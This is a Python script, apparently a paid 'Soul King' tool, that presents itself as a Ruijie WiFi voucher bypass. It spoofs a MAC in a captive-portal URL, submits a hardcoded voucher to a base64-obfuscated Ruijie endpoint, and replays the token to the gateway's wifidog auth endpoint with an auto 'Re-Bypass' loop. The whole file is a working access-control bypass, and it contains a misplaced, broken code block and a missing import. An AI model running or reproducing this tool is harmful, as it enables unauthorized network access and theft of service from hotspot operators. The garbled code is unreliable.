import re, requests, random, base64, os, sys, subprocess, time, hashlib

# ================= အရောင်ကုဒ်များ =================
GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
PURPLE = "\033[1;35m"
BLUE = "\033[1;34m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

# ================= ပြင်ဆင်ရမည့်နေရာများ =================
WIFI_URL = "Https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b64e2bfb&gw_sn=H1TC2LY00226C&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.124&mac=7a:54:66:1d:15:36&slot_num=14&nasip=192.168.1.130&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C126&chap_challenge=%5C265%5C131%5C054%5C105%5C205%5C150%5C362%5C060%5C277%5C111%5C135%5C047%5C251%5C012%5C333%5C221"
GATEWAY_IP = "192.168.120.1" 
VOUCHER_CODE = "888356" 
MY_MAC = "74:38:22:a0:f0:a4"
            access_granted = False
            for line in auth_data:
                if "|" in line:
                    parts = line.split("|")
                    if len(parts) == 3:
                        db_dev_id, db_key, db_expire = parts
                        if db_dev_id.strip() == dev_id and db_key.strip() == user_key:
                            if check_expire(db_expire.strip()):
                                access_granted = True
                                break
                            else:
                                print(f"{RED}[!] This Key has Expired! (သက်တမ်းကုန်သွားပါပြီ){RESET}")
                                sys.exit()

def check_expire(expire_date_str):
    try:
        expire_date = datetime.strptime(expire_date_str, "%Y-%m-%d")
        if datetime.now() > expire_date:
            return False  # သက်တမ်းကုန်သွားပြီ
        return True       # သက်တမ်းရှိသေးတယ်
    except:
        return False

# [+] ဤနေရာတွင် စောနက Copy ယူလာသည့် keys.txt ၏ Raw Link ကို ထည့်ပါ
GITHUB_RAW_URL = "https://raw.githubusercontent.com/htun10419-byte/soul-king-/refs/heads/main/keys.txt"
# ====================================================

saved_active_token = None

def get_device_id():
    try:
        uname = subprocess.check_output(["uname", "-a"]).decode().strip()
        user = subprocess.check_output(["whoami"]).decode().strip()
        raw_id = f"{uname}-{user}"
        return hashlib.sha256(raw_id.encode()).hexdigest()[:16].upper()
    except:
        return "UNKNOWN-DEVICE-ID"

def check_online_auth():
    os.system('clear')
    print(f"{CYAN}========================================================================={RESET}")
    print(f"{YELLOW}                    [+] SOUL KING ONLINE SECURITY [+]                    {RESET}")
    print(f"{CYAN}========================================================================={RESET}\n")
    
    dev_id = get_device_id()
    print(f"{CYAN}[+] YOUR DEVICE ID : {WHITE}{dev_id}{RESET}")
    print(f"{YELLOW}[*] Copy your Device ID and send it to the owner to register.{RESET}\n")
    
    user_key = input(f"{WHITE}[*] Enter Activation Key : {RESET}").strip()
    
    print(f"\n{WHITE}[*] Verifying with server...{RESET}")
    try:
        response = requests.get(GITHUB_RAW_URL, timeout=5)
        if response.status_code == 200:
            auth_data = response.text.splitlines()
            
            access_granted = False
            for line in auth_data:
                if "|" in line:
                    db_dev_id, db_key = line.split("|")
                    if db_dev_id.strip() == dev_id and db_key.strip() == user_key:
                        access_granted = True
                        break
            
            if access_granted:
                print(f"{GREEN}[+] Access Granted! Welcome back.{RESET}")
                time.sleep(1.5)
                return True
            else:
                print(f"{RED}[!] Access Denied! Invalid Device ID or Key.{RESET}")
                sys.exit()
        else:
            print(f"{RED}[!] Server Error: Unable to fetch auth database.{RESET}")
            sys.exit()
    except requests.RequestException:
        print(f"{RED}[!] Network Error: Please check your internet connection to verify Key.{RESET}")
        sys.exit()

def check_ping_once():
    try:
        output = subprocess.check_output(["ping", "-c", "1", "-W", "2", "8.8.8.8"], stderr=subprocess.STDOUT).decode()
        time_match = re.search(r"time=([\d.]+)\s*ms", output)
        if time_match:
            return True, f"{GREEN}[+] Ping Active: {time_match.group(1)} ms (Online){RESET}"
        return True, f"{GREEN}[+] Ping Active (Online){RESET}"
    except subprocess.CalledProcessError:
        return False, f"{RED}[!] Ping Timeout: Connection Lost!{RESET}"
    except Exception:
        return False, f"{YELLOW}[!] Unable to check ping.{RESET}"

def keep_alive_signal():
    global saved_active_token
    if not saved_active_token:
        return
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    params = {'token': saved_active_token, 'phoneNumber': '09123456789'}
    target_url = f'http://{GATEWAY_IP}:2060/wifidog/auth?'
    try:
        requests.get(target_url, params=params, headers=headers, timeout=3)
    except:
        pass

def trigger_re_bypass():
    global saved_active_token
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    params = {'token': saved_active_token, 'phoneNumber': '09123456789'}
    target_url = f'http://{GATEWAY_IP}:2060/wifidog/auth?'
    try:
        requests.get(target_url, params=params, headers=headers, timeout=3)
        return True
    except:
        return False

def start_continuous_ping():
    print(f"\n{CYAN}========================================================================={RESET}")
    print(f"{YELLOW}    [*] Anti-Disconnect & Live Monitoring Active (CTRL+C to Exit)       {RESET}")
    print(f"{CYAN}========================================================================={RESET}\n")
    try:
        while True:
            current_time = time.strftime("%H:%M:%S")
            is_online, ping_result = check_ping_once()
            
            if is_online:
                print(f"[{WHITE}{current_time}{RESET}] {ping_result}")
                if int(time.time()) % 15 == 0:
                    keep_alive_signal()
            else:
                print(f"[{WHITE}{current_time}{RESET}] {ping_result}")
                print(f"{YELLOW}[*] Detecting Disconnect! Attempting Auto Re-Bypass...{RESET}")
                
                if trigger_re_bypass():
                    time.sleep(1)
                    success, _ = check_ping_once()
                    if success:
                        print(f"{GREEN}[+] Auto Re-Bypass Successful! Internet Restored.{RESET}")
                    else:
                        print(f"{RED}[!] Auto Re-Bypass Failed. Retrying in next loop...{RESET}")
                else:
                    print(f"{RED}[!] Gateway Unreachable. Retrying...{RESET}")
                    
            time.sleep(4) 
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Live Monitoring Stopped.{RESET}\n")

def draw_banner():
    os.system('clear') 
    print(f"{RED}========================================================================={RESET}")
    print(f"{RED}███████╗ ██████╗ ██╗   ██╗██╗         ██╗  ██╗██╗███╗   ██╗ ██████╗      {RESET}")
    print(f"{RED}██╔════╝██╔═══██╗██║   ██║██║         ██║ ██╔╝██║████╗  ██║██╔════╝      {RESET}")
    print(f"{RED}███████╗██║   ██║██║   ██║██║         █████╔╝ ██║██╔██╗ ██║██║  ███╗     {RESET}")
    print(f"{RED}╚════██║██║   ██║██║   ██║██║         ██╔═██╗ ██║██║╚██╗██║██║   ██║     {RESET}")
    print(f"{RED}███████║╚██████╔╝╚██████╔╝███████╗    ██║  ██╗██║██║ ╚████║╚██████╔╝     {RESET}")
    print(f"{RED}╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      {RESET}")
    print(f"{RED}========================================================================={RESET}")
    print(f"{BLUE}             ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗           {RESET}")
    print(f"{BLUE}             ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝           {RESET}")
    print(f"{BLUE}             ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗           {RESET}")
    print(f"{BLUE}             ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║           {RESET}")
    print(f"{BLUE}             ██████╔╝   ██║   ██║     ██║  ██║███████║███████║           {RESET}")
    print(f"{BLUE}             ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝           {RESET}")
    print(f"{BLUE}========================================================================={RESET}")
    
    print(f"{CYAN}  [+] Status  : {WHITE}Ruijie WiFi Voucher Bypass Tool{RESET}")
    print(f"{CYAN}  [+] Title   : {PURPLE}Soul King Bypass Edition{RESET}")
    print(f"{CYAN}  [+] MAC     : {WHITE}{MY_MAC}{RESET}")
    print(f"{CYAN}  [+] Voucher : {GREEN}{VOUCHER_CODE}{RESET}")
    print(f"{CYAN}========================================================================={RESET}\n")

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)       
    return url

def get_session_id():
    session_url = replace_mac(WIFI_URL, MY_MAC)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        response = requests.get(session_url, headers=headers)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url).group(1)
        return session_id
    except:
        return None

def login_voucher(session_id, voucher):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "content-type": "application/json",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    }
    try:
        with requests.post(post_url, json=data, headers=headers) as response:
            return re.search('token=(.*?)&', response.text).group(1)
    except:
        return None
    
def send():
    global saved_active_token
    check_online_auth() 
    draw_banner() 
    
    _, ping_msg = check_ping_once()
    print(f"{WHITE}[*] Initial Status: {ping_msg}{RESET}\n")
    
    print(f"{WHITE}[*] Connecting to Ruijie Portal...{RESET}")
    session_id = get_session_id()
    print(f"{RED}[-] Inactive Session Id: {WHITE}{session_id}{RESET}")
    
    if not session_id:
        print(f"\n{RED}[!] Error: Session ID မရပါ။ WiFi URL ကို ပြန်စစ်ပါ။{RESET}")
        return
        
    active_session_id = login_voucher(session_id, VOUCHER_CODE)
    saved_active_token = active_session_id 
    print(f"{RED}[-] Active Token       : {WHITE}{active_session_id}{RESET}")
    
    if not active_session_id:
        print(f"\n{RED}[!] Error: Voucher Login မအောင်မြင်ပါ။ ကုဒ်ဟောင်းနေနိုင်ပါသည်။{RESET}")
        return

    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    params = {'token': active_session_id, 'phoneNumber': '09123456789'}
    
    target_url = f'http://{GATEWAY_IP}:2060/wifidog/auth?'
    try:
        response = requests.get(target_url, params=params, headers=headers).url
        print(f"{RED}[-] Final Redirect URL : {WHITE}{response}{RESET}\n")
        
        if "baidu" in response or "ruijie" in response or "success" in response.lower():
            print(f"{GREEN}========================================================================={RESET}")
            print(f"{GREEN}       ROCK ON! SOUL KING BYPASS SUCCESSFUL! (ONLINE)    {RESET}")
            print(f"{GREEN}========================================================================={RESET}")
            start_continuous_ping()
        else:
            print(f"{YELLOW}========================================================================={RESET}")
            print(f"{YELLOW}   BYPASS DONE, MY FRIEND! PLEASE CHECK YOUR INTERNET.    {RESET}")
            print(f"{YELLOW}========================================================================={RESET}")
            start_continuous_ping()
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

send()
